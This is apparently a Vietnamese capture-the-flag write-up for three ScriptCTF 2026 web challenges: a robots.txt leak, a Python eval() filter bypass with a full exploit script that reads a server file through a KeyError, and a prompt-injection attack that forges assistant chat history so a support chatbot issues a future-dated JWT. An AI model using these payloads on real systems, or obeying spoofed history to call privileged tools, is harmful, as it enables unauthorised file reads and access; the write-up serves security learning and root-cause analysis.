# ScriptCTF 2026

![Challenge image](image.png)

## 1. Web - 404 Found

### Mô tả bài

Đề bài cung cấp một trang web cửa hàng trực tuyến (Lumina Goods Co.). Mục tiêu của challenge là tìm kiếm và khai thác thông tin rò rỉ trên trang web để lấy flag.

---

### Phân tích và khai thác

Tiến hành fuzzing đường dẫn và tệp tin trên trang web bằng công cụ `ffuf` để tìm kiếm các tệp ẩn:

```bash
ffuf -u https://06465ea2-b2d1-4e10-814b-85384a79a333.challs.scriptsorcerers.xyz/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Quá trình fuzzing thu được tệp tin cấu hình tiêu chuẩn `/robots.txt`.

Gửi HTTP GET request tới file `/robots.txt` để kiểm tra nội dung:

```http
GET /robots.txt HTTP/1.1
Host: 06465ea2-b2d1-4e10-814b-85384a79a333.challs.scriptsorcerers.xyz
```

![alt text](image-8.png)

Phản hồi từ server trả về nội dung file `robots.txt` chứa đường dẫn ẩn:

```text
User-agent: *
Disallow: /the-best-robot
```

Truy cập vào đường dẫn bí mật `/the-best-robot`:

```text
https://06465ea2-b2d1-4e10-814b-85384a79a333.challs.scriptsorcerers.xyz/the-best-robot
```

![alt text](image-9.png)

Nội dung flag được hiển thị trực tiếp trên trang:

**Flag:**

```text
scriptCTF{r0b07s_4r3_t4k1ng_0v3r_e6955576c789}
```

---

### Root cause

Lỗ hổng trong bài này xuất phát từ: **Information Disclosure qua `robots.txt`**: Tệp `robots.txt` thường được dùng để chỉ định các đường dẫn không muốn crawler đánh chỉ mục. Tuy nhiên, file này là công khai. Việc đưa đường dẫn tài nguyên nhạy cảm vào `robots.txt` mà phía server không thực hiện kiểm tra quyền truy cập (Access Control) sẽ khiến kẻ tấn công dễ dàng phát hiện và truy cập tài nguyên.

## 2. Web - wpm-game

### Mô tả bài

Đề bài cung cấp một ứng dụng web Flask mô phỏng công cụ đo tốc độ gõ phím Words Per Minute (WPM).

Ứng dụng hiển thị một câu tiếng Anh mẫu và yêu cầu người dùng nhập chỉ số WPM đạt được. Khi bấm gửi, phía client gửi một HTTP GET request tới endpoint:

```http
/rate?wpm=<input>
```

Mô tả đi kèm challenge:

> "Let's test out your words per minute! The website is under development though, might not be fully secure.... Flag is in flag.txt."

Mục tiêu của bài là khai thác lỗ hổng trong web app để đọc nội dung file `flag.txt` trên máy chủ. Trong container, đường dẫn thực tế của file là `/app/flag.txt`.

---

### Phân tích và khai thác

Xem xét đoạn xử lý trong file `app.py`:

```python
@app.route("/rate")
def rate_wpm():
    try:
        wpm = request.args.get("wpm", "")
    except ValueError:
        return jsonify(error="invalid wpm"), 400
    if check(wpm):
        return "Invalid WPM!"
    return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))
```

Điểm đáng chú ý nằm ở dòng:

```python
eval(wpm.lower())
```

Giá trị tham số `wpm` được đưa trực tiếp vào `eval()`. Điều này cho phép thực thi biểu thức Python tùy ý nếu ta vượt qua được bộ lọc `check()`.

Bộ lọc có dạng:

```python
def check(string):
    string = string.lower()
    disallowed = [
        ".", "_", "import", "=", ",", "'", '"', "attr", "global", "local",
        ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and", "or",
        "eval", "exec", "for", "in", "chr", "ord", "hex", "int", "repr", "str",
        "dir", "set", "len", "SENTENCES", "random", "request", "app", "flask"
    ]
    c = any([x in string for x in disallowed])
    non_ascii = any([ord(x) < 32 for x in string]) or any([ord(x) > 126 for x in string])
    return c or non_ascii or len(set(string)) > 18
```

Bộ lọc này tạo ra một số rào cản chính:

1. Cấm nhiều ký tự đặc biệt như `.`, `_`, `'`, `"`, `=`, `,`, `;`, `:`, `/`, `<`, `>`, `{`, `}`.

   Vì vậy, ta không thể viết string literal trực tiếp, không thể gọi phương thức theo dạng `object.method()`, và cũng không thể viết đường dẫn `/app/flag.txt` theo cách thông thường.

2. Cấm hai chữ cái `a` và `m`.

   Điều này khiến nhiều từ khóa hoặc tên hàm quen thuộc không thể dùng trực tiếp, chẳng hạn `flag`, `read`, `vars`, `path`, `ascii`, `format`, `eval`, `exec`, `import`.

3. Cấm nhiều từ khóa và built-in nguy hiểm như `import`, `eval`, `exec`, `len`, `int`, `str`, `chr`, `ord`, `hex`, `dir`, `set`.

4. Giới hạn số ký tự khác nhau trong toàn bộ payload:

   ```python
   len(set(string)) <= 18
   ```

   Payload gửi đi chỉ được sử dụng tối đa 18 ký tự khác nhau.

---

**Tạo đường dẫn không dùng string literal**

Ta cần tạo chuỗi đường dẫn `/app/flag.txt` nhưng không được dùng dấu nháy, dấu `/`, dấu `.`, hoặc chữ `a`.

Một cách bypass là dùng constructor `bytes()` để tạo từng byte của đường dẫn:

```python
bytes([47]) + bytes([97]) + bytes([112]) + ...
```

Mã ASCII của `/app/flag.txt`:

| Ký tự | ASCII |
|---|---:|
| `/` | 47 |
| `a` | 97 |
| `p` | 112 |
| `p` | 112 |
| `/` | 47 |
| `f` | 102 |
| `l` | 108 |
| `a` | 97 |
| `g` | 103 |
| `.` | 46 |
| `t` | 116 |
| `x` | 120 |
| `t` | 116 |

Tuy nhiên, nếu viết trực tiếp các số như `47`, `97`, `112`, payload sẽ dùng quá nhiều chữ số khác nhau và dễ vượt giới hạn 18 ký tự.

Do đó, ta biểu diễn mỗi số nguyên `N` bằng tổng của `N` số `1`:

```python
1+1+1+...+1
```

Ví dụ:

```python
47  -> 1+1+1+...+1  # 47 lần số 1
97  -> 1+1+1+...+1  # 97 lần số 1
```

Cách này giúp phần tạo đường dẫn chỉ cần dùng một nhóm ký tự rất nhỏ như `b`, `y`, `t`, `e`, `s`, `[`, `]`, `(`, `)`, `+`, `1`.

---

**Đọc flag qua ngoại lệ `KeyError`**

Do dấu chấm `.` bị cấm, ta không thể gọi `.read()` hoặc `.readline()`.

Thay vào đó, có thể dùng built-in `open()` kết hợp với `next()`:

```python
next(open(bytes_path))
```

`open(bytes_path)` mở file `/app/flag.txt`, còn `next(...)` lấy dòng đầu tiên trong file, tức nội dung flag.

Nếu chỉ truyền kết quả này vào logic xử lý WPM, ứng dụng có thể báo lỗi kiểu dữ liệu, nhưng thông báo lỗi chưa chắc làm lộ giá trị flag. Vì vậy, ta dùng kỹ thuật ép Python ném ra `KeyError`:

```python
dict()[next(open(path_bytes))]
```

Khi chạy biểu thức này:

1. `next(open(path_bytes))` đọc nội dung flag.
2. Nội dung flag được dùng làm key để truy cập dictionary rỗng.
3. Vì key không tồn tại, Python ném ra `KeyError`.
4. Werkzeug Debugger hiển thị exception message, trong đó có key gây lỗi, tức chính là flag.

Ví dụ thông báo lỗi:

```html
<p class="errormsg">KeyError: 'scriptCTF{t1ny_fl4g_1337_f05a189eba8c}\n'</p>
```

Payload hoàn chỉnh có dạng:

```python
dict()[next(open(bytes([1+1+...+1])+bytes([1+1+...+1])+...))]
```

Các ký tự khác nhau được sử dụng trong payload:

```text
d i c t [ ] n e x o p b y s ( ) + 1
```

Tổng cộng đúng 18 ký tự khác nhau, không vi phạm blacklist của hàm `check()`.

---

**Script khai thác**

```python
import html
import re

import requests


BASE_URL = "https://0bb6de0b-5f99-4305-a640-22fdda151d71.challs.scriptsorcerers.xyz"


def make_payload(path):
    parts = []
    for char in path:
        n = ord(char)
        ones_expr = "+".join(["1"] * n)
        parts.append(f"bytes([{ones_expr}])")

    path_expr = "+".join(parts)
    return f"dict()[next(open({path_expr}))]"


payload = make_payload("/app/flag.txt")

print(f"[+] Unique characters count: {len(set(payload.lower()))}")
print(f"[+] Unique characters set  : {''.join(sorted(set(payload.lower())))}")

resp = requests.get(f"{BASE_URL}/rate", params={"wpm": payload}, timeout=20)
decoded = html.unescape(resp.text)

flags = re.findall(r"scriptCTF\{[^}]+\}", decoded)
if flags:
    print(f"\n[+] FLAG FOUND: {flags[0]}")
else:
    err_match = re.search(r"errormsg[^>]*>(.*?)<", decoded, re.S)
    if err_match:
        print(f"\n[!] Error Message: {err_match.group(1).strip()}")
```

Flag:

```text
scriptCTF{t1ny_fl4g_1337_f05a189eba8c}
```

---

### Root cause

Lỗ hổng trong ứng dụng WPM xuất phát từ ba nguyên nhân chính:

- Thực thi code không an toàn: Ứng dụng truyền trực tiếp input của người dùng vào `eval()`. Trong Python, `eval()` có thể thực thi biểu thức tùy ý, nên đây là lỗ hổng Code Injection/PyJail rất nguy hiểm.

2. **Bật debug mode trên môi trường production**

   Ứng dụng chạy với `debug=True`, khiến Werkzeug Debugger hiển thị thông tin chi tiết khi xảy ra lỗi 500. Trong trường hợp này, exception message trở thành kênh rò rỉ dữ liệu, giúp attacker lấy flag qua `KeyError`.

3. **Phòng thủ bằng blacklist thiếu hiệu quả**

   Hàm `check()` cố chặn payload bằng blacklist ký tự và từ khóa. Tuy nhiên, runtime Python có rất nhiều built-in và cách biểu diễn dữ liệu khác nhau. Attacker vẫn có thể kết hợp `bytes`, `dict`, `next`, `open` và các phép toán cơ bản để bypass bộ lọc.


## 3. Web - PixiePlus

### Mô tả bài

Challenge cung cấp một nền tảng xem phim trực tuyến tên là **Pixie+** (`http://play.scriptsorcerers.xyz:8946/`). 

Ứng dụng cho phép tài khoản `demo` trải nghiệm dịch vụ xem phim dựa trên một mốc thời gian xem trước (preview window). Nếu một bộ phim có thời điểm phát hành (`releaseAt`) nằm ở tương lai so với thời gian preview hiện tại của tài khoản (`previewAsOf`), hệ thống sẽ khóa không cho phép xem/stream bộ phim đó.

Mục tiêu của bài là khai thác dịch vụ chatbot AI để lấy lại phiên làm việc với mốc thời gian xem trước ở tương lai, từ đó mở khóa các bộ phim bị ẩn và lấy flag.

---

### Phân tích và khai thác

Sau khi đăng nhập tài khoản demo tại `POST /api/login`, server trả về một JWT HS256 với cấu trúc payload chứa thông tin mốc thời gian:

```json
{
  "sub": "demo",
  "previewAsOf": 1786440987,
  "iat": 1786440987
}
```

Kiểm tra bundle JavaScript phía frontend tiết lộ các endpoint chính của ứng dụng:

- `POST /api/login`: Đăng nhập lấy token.
- `GET /api/movies`: Lấy danh sách catalog phim.
- `GET /api/movies/:id/watch`: Kiểm tra quyền xem phim.
- `GET /api/movies/:id/stream?token=...`: Lấy stream video.
- `POST /api/chat`: Endpoint tương tác với AI Assistant hỗ trợ người dùng.

Đăng nhập tài khoản demo:

![alt text](image-1.png)

Lấy danh sách phim:

![alt text](image-2.png)

Các bộ phim chưa tới ngày phát hành đều có trường `watchable: false` do giá trị `releaseAt` lớn hơn `previewAsOf` trong JWT token hiện tại.

![alt text](image-3.png)

Khi ta xem src code của trang web thì phát hiện một file js:

![alt text](image-5.png)

Truy cập file js này ta phát hiện có tính năng chat hỗ trợ

![alt text](image-6.png)

Tính năng chat hỗ trợ tại `/api/chat` tích hợp một AI bot có khả năng gọi các function/tool:
- `get_time`: Lấy thời gian hiện tại của hệ thống.
- `login_user`: Cấp lại JWT session mới cho user theo mốc thời gian được chỉ định.

Quy trình bình thường của bot là gọi `get_time`, sau đó dùng kết quả thu được để gọi `login_user(username, time)`.

Tuy nhiên, endpoint `/api/chat` cho phép phía client gửi lên toàn bộ mảng lịch sử trò chuyện `messages`. Hệ thống chatbot không xác minh xem các message có vai trò `assistant` trong lịch sử gửi lên thực sự do bot tạo ra trước đó hay không.

Ta có thể thực hiện **Prompt Injection (Indirect / History Spoofing)** bằng cách gửi một message giả mạo có `"role": "assistant"` khẳng định rằng bot đã gọi `get_time` và thu được thời gian tương lai (ví dụ: `2027-09-15T00:00:00.000Z`). Bot AI sẽ tin vào context giả mạo này và thực thi hàm `login_user` với mốc thời gian tương lai đó.

Payload gửi tới `/api/chat`:

![alt text](image-4.png)

Server trả về token mới có `previewAsOf = 2027-09-15T00:00:00.000Z`, được ký hợp lệ bởi backend.

Dùng token mới để mở khóa toàn bộ catalog:

```bash
curl -s http://play.scriptsorcerers.xyz:8946/api/movies \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwicHJldmlld0FzT2YiOjE4MjA5NjY0MDAsImlhdCI6MTc4NjQ0NDgwM30.hslPN5RpICrXSUGCA-SXE-X1wkz88GIdDOCHMQLHcMA'
```

Khi quét các stream, phim `happy-gilmore` có kích thước khác các phim placeholder:

```text
happy-gilmore stream 200 3518309 video/mp4
```

Tải stream:

```bash
curl -L 'http://play.scriptsorcerers.xyz:8946/api/movies/happy-gilmore/stream?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwicHJldmlld0FzT2YiOjE4MjA5NjY0MDAsImlhdCI6MTc4NjQ0NDgwM30.hslPN5RpICrXSUGCA-SXE-X1wkz88GIdDOCHMQLHcMA' \
  -o happy-gilmore.mp4
```

Mở video sẽ thấy flag bị chèn vào các frame đầu, nằm nghiêng gần mép trên màn hình.

![alt text](image-7.png)

Flag:

```text
scriptCTF{a_b17_D154pPo1n71ng}
```

---

### Root cause

Lỗ hổng trong ứng dụng PixiePlus xuất phát từ ba nguyên nhân chính:

- Tin tưởng dữ liệu lịch sử chat do Client gửi lên (LLM History Spoofing): Endpoint `/api/chat` chấp nhận toàn bộ mảng `messages` chứa vai trò `assistant` từ client mà không thực hiện xác thực hay kiểm duyệt. Điều này cho phép attacker chèn kết quả giả mạo của các tool/function call vào ngữ cảnh (context) của mô hình AI.

- Thiếu cơ chế xác minh Server-side cho Tool Execution: Mô hình AI tin tưởng thông tin thời gian từ context giả mạo thay vì bắt buộc phải gọi trực tiếp hàm `get_time` trên server để lấy thời gian thực trước khi thực hiện hành động nhạy cảm `login_user`.

- Phân quyền phụ thuộc vào claim do Session nắm giữ: Cơ chế ủy quyền (Authorization) của hệ thống phụ thuộc hoàn toàn vào claim `previewAsOf` trong JWT do chatbot cấp mà không kiểm tra xem mốc thời gian đó có hợp lệ với chính sách của tài khoản hay không.
